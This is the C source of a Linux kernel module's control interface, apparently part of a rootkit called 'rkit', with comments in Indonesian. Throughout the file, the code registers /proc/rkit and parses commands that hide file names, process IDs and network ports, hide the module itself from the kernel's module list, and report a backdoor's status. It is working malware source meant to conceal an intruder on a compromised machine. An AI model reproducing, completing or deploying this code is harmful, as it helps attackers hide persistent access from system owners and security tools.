/*
 * ctl_proc.c — interface runtime lewat /proc/rkit (tulis perintah).
 *
 * Format tulis (satu perintah per write):
 *   hide <nama>        unhide <nama>
 *   hidepid <pid>      unhidepid <pid>
 *   hideport <port>    unhideport <port>
 *   modhide            modshow   (self-hide modul — modshow SEBELUM rmmod!)
 *
 * Format baca (rkit status): daftar tersembunyi + status modul/backdoor.
 *
 * Catatan: daftar yang ditulis via CLI (control/cli/rkit) juga disimpan
 * ke /var/lib/rkit/state agar pulih saat reboot (lihat tools/rkit-load.sh).
 * Menulis langsung ke /proc/rkit TIDAK menyimpan state.
 *
 * Era legacy_4x memakai module parameter saja.
 */
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/ctype.h>
#include "rkit.h"

static struct proc_dir_entry *g_proc;
static char g_status[768];

static ssize_t rkit_read(struct file *f, char __user *ubuf,
			 size_t count, loff_t *ppos)
{
	(void)f;
	rk_list_status(g_status, sizeof(g_status));
	return simple_read_from_buffer(ubuf, count, ppos,
				       g_status, strlen(g_status));
}

static ssize_t rkit_write(struct file *f, const char __user *ubuf,
			  size_t count, loff_t *ppos)
{
	char kbuf[128], *cmd, *arg;
	size_t n = count < sizeof(kbuf) - 1 ? count : sizeof(kbuf) - 1;
	int ret = 0;

	(void)f;
	(void)ppos;
	if (copy_from_user(kbuf, ubuf, n))
		return -EFAULT;
	kbuf[n] = '\0';
	if (n && kbuf[n - 1] == '\n')
		kbuf[n - 1] = '\0';

	cmd = kbuf;
	while (*cmd == ' ')
		cmd++;
	arg = strchr(cmd, ' ');
	if (arg) {
		*arg = '\0';
		arg++;
		while (*arg == ' ')
			arg++;
	} else {
		arg = "";
	}

	if (strcmp(cmd, "hide") == 0)
		ret = rk_list_add_name(arg);
	else if (strcmp(cmd, "unhide") == 0)
		ret = rk_list_del_name(arg);
	else if (strcmp(cmd, "hidepid") == 0 && arg[0])
		ret = rk_list_add_pid(simple_strtoul(arg, NULL, 10));
	else if (strcmp(cmd, "unhidepid") == 0 && arg[0])
		ret = rk_list_del_pid(simple_strtoul(arg, NULL, 10));
	else if (strcmp(cmd, "hideport") == 0 && arg[0]) {
		unsigned long p = simple_strtoul(arg, NULL, 10);
		ret = (p && p <= 65535) ? rk_list_add_port((u16)p) : -EINVAL;
	} else if (strcmp(cmd, "unhideport") == 0 && arg[0]) {
		unsigned long p = simple_strtoul(arg, NULL, 10);
		ret = (p && p <= 65535) ? rk_list_del_port((u16)p) : -EINVAL;
	} else if (strcmp(cmd, "modhide") == 0)
		ret = rk_modhide_hide();
	else if (strcmp(cmd, "modshow") == 0)
		ret = rk_modhide_show();
	else
		ret = -EINVAL;

	return ret ? ret : (ssize_t)count;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)

/* ---- cabang A: kernel >=5.6 memakai struct proc_ops ---- */
static const struct proc_ops rkit_ops = {
	.proc_read  = rkit_read,
	.proc_write = rkit_write,
	.proc_lseek = default_llseek,
};

int rk_ctl_init(void)
{
	g_proc = proc_create("rkit", 0600, NULL, &rkit_ops);
	if (!g_proc) {
		pr_err("rkit: gagal buat /proc/rkit\n");
		return -ENOMEM;
	}
	pr_info("rkit: interface /proc/rkit aktif (0600)\n");
	return 0;
}

#else /* kernel5.0 -5.5: struct file_operations ---- */

static const struct file_operations rkit_ops = {
	.owner  = THIS_MODULE,
	.read   = rkit_read,
	.write  = rkit_write,
	.llseek = default_llseek,
};

int rk_ctl_init(void)
{
	g_proc = proc_create("rkit", 0600, NULL, &rkit_ops);
	if (!g_proc) {
		pr_err("rkit: gagal buat /proc/rkit\n");
		return -ENOMEM;
	}
	pr_info("rkit: interface /proc/rkit aktif (0600)\n");
	return 0;
}

#endif /* LINUX_VERSION_CODE >=5.6 */

void rk_ctl_exit(void)
{
	if (g_proc) {
		proc_remove(g_proc);
		g_proc = NULL;
	}
}
